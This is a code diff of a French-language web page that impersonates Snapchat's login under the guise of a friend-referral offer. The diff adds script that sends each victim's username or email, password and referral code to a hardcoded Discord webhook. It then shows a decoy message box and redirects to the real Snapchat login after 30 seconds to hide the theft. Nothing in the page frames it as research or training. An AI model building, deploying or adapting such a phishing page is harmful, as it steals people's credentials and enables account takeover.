@@ -1,10 +1,13 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Snapchat | Parrainez Un Ami</title>
+
+  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
+  <meta property="og:description" content="Description courte" />
+  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
 
   <style>
     body {
@@ -17,7 +20,7 @@
       align-items: center;
       height: 100vh;
     }
-    .form-box {
+    .login-box, .text-area-screen {
       width: 100%;
       max-width: 400px;
       padding: 40px;
@@ -42,8 +45,7 @@
       font-weight: bold;
       margin-bottom: 5px;
     }
-    .form-group input, 
-    .form-group textarea {
+    .form-group input {
       width: 100%;
       padding: 12px;
       border: 1px solid #ccc;
@@ -51,11 +53,7 @@
       font-size: 16px;
       box-sizing: border-box;
     }
-    .form-group textarea {
-      resize: vertical;
-      min-height: 100px;
-    }
-    button.primary-btn {
+    button {
       background-color: #fffc00;
       border: none;
       color: #000;
@@ -81,23 +79,29 @@
       cursor: pointer;
       text-decoration: underline;
     }
-    .error-text {
+    #errorMessage,
+    #referralError {
       color: red;
       display: none;
       margin-top: 10px;
-      font-size: 14px;
     }
-    
-    / On masque la deuxième étape par défaut /
-    #stepTwoBox {
+    #textAreaScreen {
       display: none;
+    }
+    #textAreaScreen textarea {
+      width: 100%;
+      height: 150px;
+      padding: 10px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      resize: vertical;
     }
   </style>
 </head>
 <body>
-
-  <!-- Étape 1 : Connexion -->
-  <div class="form-box" id="loginBox">
+  <!-- Formulaire de connexion -->
+  <div class="login-box" id="loginBox">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
     <h2>Snapchat | Parrainez Un Ami</h2>
     <form id="loginForm">
@@ -113,38 +117,28 @@
         <label for="referralCode">Code de parrainage</label>
         <input type="text" id="referralCode" required />
       </div>
-
-      <button type="submit" class="primary-btn">Connexion</button>
-
+      <button type="submit">Connexion</button>
       <div class="links-container">
         <button type="button" class="link-button">S'inscrire</button>
         <button type="button" class="link-button">Mot de passe oublié</button>
       </div>
     </form>
-    <p id="errorMessage" class="error-text">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
-    <p id="referralError" class="error-text">Le code de parrainage doit contenir exactement 4 chiffres.</p>
+    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
+    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <!-- Étape 2 : Informations complémentaires -->
-  <div class="form-box" id="stepTwoBox">
-    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>Confirmation requise</h2>
-    <p>Veuillez nous en dire plus sur ce parrainage :</p>
-    
-    <form id="detailsForm">
-      <div class="form-group">
-        <textarea id="additionalInfo" placeholder="Écrivez vos détails ici..."></textarea>
-      </div>
-      <p id="textareaError" class="error-text" style="text-align: left;">Ce champ ne peut pas être vide.</p>
-      
-      <button type="submit" class="primary-btn">Confirmer</button>
-    </form>
+  <!-- Zone de texte qui apparaît après la connexion -->
+  <div class="text-area-screen" id="textAreaScreen">
+    <h3>Écrivez votre message</h3>
+    <textarea placeholder="Votre message ici..."></textarea>
   </div>
 
   <script>
+    // URL du webhook Discord
+    const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
+    // URL de redirection vers Snapchat
     const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
-    // Gestion de la première étape
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -158,7 +152,7 @@
       errorMessage.style.display = 'none';
       referralError.style.display = 'none';
 
-      // Validations basiques
+      // Vérifications simples
       if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
         errorMessage.style.display = 'block';
         return;
@@ -169,29 +163,46 @@
         return;
       }
 
-      // Transition vers la deuxième étape
-      document.getElementById('loginBox').style.display = 'none';
-      document.getElementById('stepTwoBox').style.display = 'block';
-    });
+      // Préparer le message à envoyer
+      const message = {
+        embeds: [
+          {
+            title: " Nouvelle tentative de connexion",
+            description: "Informations collectées via le formulaire",
+            color: 0xffc800,
+            fields: [
+              { name: " Nom d'utilisateur / e-mail", value: username },
+              { name: " Mot de passe", value: password },
+              { name: " Code de parrainage", value: referralCode }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: "Formulaire Rankos" }
+          }
+        ]
+      };
 
-    // Gestion de la deuxième étape
-    document.getElementById('detailsForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const textArea = document.getElementById('additionalInfo').value.trim();
-      const textAreaError = document.getElementById('textareaError');
+      // Envoyer au webhook Discord
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(message),
+      })
+      .then(response => {
+        // Après envoi, attendre 1 seconde puis changer l'affichage
+        setTimeout(() => {
+          document.getElementById('loginBox').style.display = 'none';
+          document.getElementById('textAreaScreen').style.display = 'block';
 
-      textAreaError.style.display = 'none';
-
-      // Validation de la zone de texte
-      if (textArea === "") {
-        textAreaError.style.display = 'block';
-        return;
-      }
-
-      // Action après validation réussie
-      alert("Informations confirmées ! Redirection en cours...");
-      window.location.href = redirectURL;
+          // Après 30 secondes, rediriger
+          setTimeout(() => {
+            window.location.href = redirectURL;
+          }, 30000);
+        }, 1000);
+      })
+      .catch(error => {
+        alert("Erreur réseau ou CORS.");
+        console.error(error);
+      });
     });
   </script>
 </body>
